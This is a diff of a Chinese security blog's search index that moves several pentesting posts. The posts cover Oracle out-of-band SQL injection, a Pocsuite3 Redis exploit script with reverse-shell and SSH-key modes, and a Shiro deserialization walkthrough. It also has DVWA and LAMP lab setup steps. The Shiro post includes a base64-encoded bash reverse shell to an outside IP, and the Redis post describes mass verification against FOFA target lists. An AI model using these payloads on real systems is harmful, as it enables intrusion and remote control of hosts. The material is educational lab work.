-<td align="left">UTL_INADDR.GET_HOST_ADDRESS</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="left">SYS.DBMS_LDAP.INIT</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<p>外带注入过程</p>
-<table>
-<thead>
-<tr>
-<th align="left">方法</th>
-<th align="left">语句</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">检测函数是否可用</td>
-<td align="left"><code>and exists(select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;)--</code> <br>回显正常则可用</td>
-</tr>
-<tr>
-<td align="left">开启本地监听</td>
-<td align="left"><code>python -m http.server 1111</code></td>
-</tr>
-<tr>
-<td align="left">反弹信息</td>
-<td align="left">`and UTL_HTTP.request(‘<a href="http://ip:监听端口/&#39;">http://ip:监听端口/&#39;</a></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Web渗透</category>
-      </categories>
-      <tags>
-        <tag>Oracle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pocsuite3重写redis脚本</title>
-    <url>/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本脚本只做学习使用，请勿用作非法用途！</p>
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：<code>redis.py</code></p>
-<p>其中，shell模式下会报错，但是不影响命令写入和反弹shell（反弹sell需要手动监听6666端口–pocsuite默认监听端口）。这里的报错导致脚本本身的监听出错了，只要手动开启监听就可以。</p>
-<pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>
-
-<p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
-<hr>
-<p>分割线 2021-08-14</p>
-<hr>
-<p>修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接</p>
-<p><strong>使用须知：</strong></p>
-<pre class="highlight"><span class="line">attack模式下：</span><br><span class="line">需要redis-cli客户端命令</span><br><span class="line">安装：</span><br><span class="line">	wget http://download.redis.io/redis-stable.tar.gz #下载redis-cli</span><br><span class="line">	tar -zxvf redis-stable.tar.gz</span><br><span class="line">	cd redis-stable </span><br><span class="line">	make </span><br><span class="line">	cp src/redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line">需要提前在本地生成公钥文件</span><br><span class="line">方法：</span><br><span class="line">	1、ssh-keygen -t rsa  生成密钥（管理员权限）</span><br><span class="line">	2、(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">	3、在公钥目录执行命令，并将key.txt移动到脚本目录</span><br><span class="line">	注：windows在用户目录/.ssh下，linux在/root/.ssh/下</span><br></pre>
-
-
-
-<hr>
-<p>分割线 2021-08-19</p>
-<hr>
-<p>由于漏洞太老了，实战中虽然存在不少空密码、弱口令，但是几乎全做了权限限制，无法写入公钥、定时任务（这个还收服务器类型限制）。于是增加版本检测功能，搭配 宝er 魔改的redis-rogue-server工具使用，可低权限进入4.x-5.0.5命令执行，然后提权。</p>
-<p><strong>使用过程：</strong></p>
-<p>1、<code>--verify </code>    验证模式</p>
-<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --verify</span><br></pre>
-
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" alt="image-20210814221643832" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" class="lozad post-image"></p>
-<p>2、<code>--shell</code>    反弹shell</p>
-<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --shell</span><br></pre>
-
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" alt="image-20210814222129814" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" class="lozad post-image"></p>
-<p>需要等待反弹shell定时任务生效，约1分钟</p>
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" alt="image-20210814222420607" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">list:列出反弹shell列表</span><br><span class="line">use:使用指定反弹shell</span><br></pre>
-
-
-
-<p>3、ssh连接</p>
-<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --attack</span><br></pre>
-
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" alt="image-20210814223217104" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" class="lozad post-image"></p>
-<p>执行<code>ssh root@192.168.21.237</code>，成功无密码连接靶机</p>
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" alt="image-20210814223320023" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" class="lozad post-image"></p>
-<p>可搭配fofa搜索，导出目标列表，批量验证。</p>
-<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -f ./test.txt --threads 20 --verify</span><br></pre>
-
-<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" alt="image-20210814223939569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" class="lozad post-image"></p>
-<p>警告！</p>
-<p>shell、attack模式严禁用于非法用途，仅做本地测试及pocsuite编写学习！</p>
-<p>下载地址：</p>
-<p>旧版（爆破功能）</p>
-<p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
-<p>新版（pocsuite3模块）</p>
-<p><del><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></del></p>
-<p><a href="https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Redis</tag>
       </tags>
   </entry>
   <entry>
@@ -4704,6 +4641,69 @@
       </tags>
   </entry>
   <entry>
+    <title>Pocsuite3重写redis脚本</title>
+    <url>/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本脚本只做学习使用，请勿用作非法用途！</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：<code>redis.py</code></p>
+<p>其中，shell模式下会报错，但是不影响命令写入和反弹shell（反弹sell需要手动监听6666端口–pocsuite默认监听端口）。这里的报错导致脚本本身的监听出错了，只要手动开启监听就可以。</p>
+<pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>
+
+<p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
+<hr>
+<p>分割线 2021-08-14</p>
+<hr>
+<p>修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接</p>
+<p><strong>使用须知：</strong></p>
+<pre class="highlight"><span class="line">attack模式下：</span><br><span class="line">需要redis-cli客户端命令</span><br><span class="line">安装：</span><br><span class="line">	wget http://download.redis.io/redis-stable.tar.gz #下载redis-cli</span><br><span class="line">	tar -zxvf redis-stable.tar.gz</span><br><span class="line">	cd redis-stable </span><br><span class="line">	make </span><br><span class="line">	cp src/redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line">需要提前在本地生成公钥文件</span><br><span class="line">方法：</span><br><span class="line">	1、ssh-keygen -t rsa  生成密钥（管理员权限）</span><br><span class="line">	2、(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">	3、在公钥目录执行命令，并将key.txt移动到脚本目录</span><br><span class="line">	注：windows在用户目录/.ssh下，linux在/root/.ssh/下</span><br></pre>
+
+
+
+<hr>
+<p>分割线 2021-08-19</p>
+<hr>
+<p>由于漏洞太老了，实战中虽然存在不少空密码、弱口令，但是几乎全做了权限限制，无法写入公钥、定时任务（这个还收服务器类型限制）。于是增加版本检测功能，搭配 宝er 魔改的redis-rogue-server工具使用，可低权限进入4.x-5.0.5命令执行，然后提权。</p>
+<p><strong>使用过程：</strong></p>
+<p>1、<code>--verify </code>    验证模式</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --verify</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" alt="image-20210814221643832" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" class="lozad post-image"></p>
+<p>2、<code>--shell</code>    反弹shell</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --shell</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" alt="image-20210814222129814" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" class="lozad post-image"></p>
+<p>需要等待反弹shell定时任务生效，约1分钟</p>
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" alt="image-20210814222420607" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">list:列出反弹shell列表</span><br><span class="line">use:使用指定反弹shell</span><br></pre>
+
+
+
+<p>3、ssh连接</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --attack</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" alt="image-20210814223217104" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" class="lozad post-image"></p>
+<p>执行<code>ssh root@192.168.21.237</code>，成功无密码连接靶机</p>
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" alt="image-20210814223320023" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" class="lozad post-image"></p>
+<p>可搭配fofa搜索，导出目标列表，批量验证。</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -f ./test.txt --threads 20 --verify</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" alt="image-20210814223939569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" class="lozad post-image"></p>
+<p>警告！</p>
+<p>shell、attack模式严禁用于非法用途，仅做本地测试及pocsuite编写学习！</p>
+<p>下载地址：</p>
+<p>旧版（爆破功能）</p>
+<p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
+<p>新版（pocsuite3模块）</p>
+<p><del><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></del></p>
+<p><a href="https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python之爆破脚本</title>
     <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
@@ -4923,28 +4923,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
-
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
-
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Shiro</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入思路整理</title>
     <url>/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>本篇只介绍思路，不做详细注入语句讲解。</p>
@@ -5111,6 +5089,28 @@
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
+
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
+
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -5863,55 +5863,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7搭建DVWA</title>
-    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
-    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
-<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<p>启动apache并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
-
-<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<p>启动Mysql并设置开机自启</p>
-<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
-
-<p>配置Mysql数据库</p>
-<p>初始化mysql数据库（全部回车确认）</p>
-<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
-
-<p>设置mysql密码（非操作系统密码）</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
-
-<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
-<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
-
-<p>重启apache使php生效（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<p>配置</p>
-<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
-
-<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
-
-<p>解压并复制到/var/www/html目录</p>
-<p>配置</p>
-<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
-
-<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
-
-<p>创建数据库</p>
-<p>登录（admin:password）</p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE和SSRF</title>
     <url>/article/XXE%E5%92%8CSSRF/</url>
     <content><![CDATA[<p>XML是可拓展标识语言的简写；功能是传输数据，不是显示数据；</p>
@@ -6267,6 +6218,55 @@
       <tags>
         <tag>XXE</tag>
         <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>centos7搭建DVWA</title>
+    <url>/article/centos7%E6%90%AD%E5%BB%BADVWA/</url>
+    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<p>启动apache并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>
+
+<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<p>启动Mysql并设置开机自启</p>
+<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>
+
+<p>配置Mysql数据库</p>
+<p>初始化mysql数据库（全部回车确认）</p>
+<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>
+
+<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<p>重启apache使php生效（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<p>配置</p>
+<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>
+
+<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>
+
+<p>解压并复制到/var/www/html目录</p>
+<p>配置</p>
+<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>
+
+<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>
+
+<p>创建数据库</p>
+<p>登录（admin:password）</p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -6691,50 +6691,6 @@
       </tags>
   </entry>
   <entry>
-    <title>搭建LAMP环境</title>
-    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
-<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
-
-<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
-
-<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
-
-<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
-
